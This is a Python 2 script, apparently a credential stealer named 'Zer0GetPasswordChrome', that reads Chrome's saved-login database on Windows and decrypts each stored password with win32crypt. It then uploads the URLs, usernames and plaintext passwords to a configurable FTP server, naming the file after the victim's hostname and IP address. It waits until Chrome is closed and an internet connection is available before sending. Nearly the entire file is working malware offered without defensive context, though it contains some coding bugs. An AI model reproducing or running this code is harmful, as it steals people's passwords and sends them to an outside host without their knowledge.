#!/usr/bin/env python
#-*- coding: utf-8 -*-

import os, sys, sqlite3, time, ftplib, urllib2, tempfile, socket

try:
    import win32crypt

except:

    print "Please install win32crypt module"

    exit(1)


# waiting time to verify internet connection
DELAY_SLEEP = 10

# ftp server address
HOST_FTP = "ftp.yourHost.com"

#The email address that sends the message
USER_FTP = "yourUser"

#Password of the email address that sends the message
PASSWORD_FTP = "yourPassword"


class ChromePass:

	def __init__(self):

		self.result = ""

		while True:

			try:

				path = os.getenv('USERPROFILE') + "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
				
				with open(path): pass
				
				cursor = sqlite3.connect(os.getenv('USERPROFILE') + "\AppData\Local\Google\Chrome\User Data\Default\Login Data").cursor()

				cursor.execute('SELECT action_url, username_value, password_value FROM logins')

				break

			except Exception as e:
				if not str(e) == "database is locked":
					
					if type(e) is IOError:
						e = "Chrome not found"
					
					msgWarning(e)

			print "Waits for chrome to be closed..."

			time.sleep(DELAY_SLEEP)

		self.logs = cursor.fetchall()

		self.urlFind = len(self.logs)


	@property
	def logs(self):
		return self._logs


	@logs.setter
	def logs(self, logs):

		if not self.urlFind:
			msgWarning("The query did not give any result")

		self._logs = logs


	def run(self):

		if not os.name == "nt":
			msgWarning("The operating system is not Windows")

		passwordFind = self.urlFind

		for log in self.logs:

			try:
				password = win32crypt.CryptUnprotectData(log[2], None, None, None, 0)[1]
				
			except Exception as e:
				msgWarning(e)

			email = log[1]

			if not password:

				password = "Not found"

				if not email:
					email = "Not found"

				passwordFind -= 1

			self.result += "{} ({},{})\n".format(log[0], email, password)

		self.result += "\nZer0GetPasswordChrome done: {} urls ({} passwords found) found".format(self.urlFind, passwordFind)

		self.send()

		sys.exit(0)


	def send(self):

		req = urllib2.Request('http://www.google.fr')

		while True:

			try:

				urllib2.urlopen(req)

				break
			
			except:

				print "Wait for an Internet connection..."

				time.sleep(DELAY_SLEEP)

		f = tempfile.TemporaryFile()

		f.write(self.result)

		f.seek(0)

		ftp = ftplib.FTP(HOST_FTP, USER_FTP, PASSWORD_FTP)

		try:

			ftp.mkd("getPasswordChrome")

			ftp.sendcmd('CWD getPasswordChrome')

		except Exception as e:
			if "File exists" in str(e):
				ftp.sendcmd('CWD getPasswordChrome')

		ftp.storbinary("STOR " + socket.gethostname() + "-" + socket.gethostbyname(socket.gethostname()) + ".txt", f)

		ftp.quit()

		f.close()


	def msgWarning(var):

		self.result = var

		self.send()

		sys.exit(1)


def main():
	ChromePass().run()


if __name__ == "__main__":
	main()
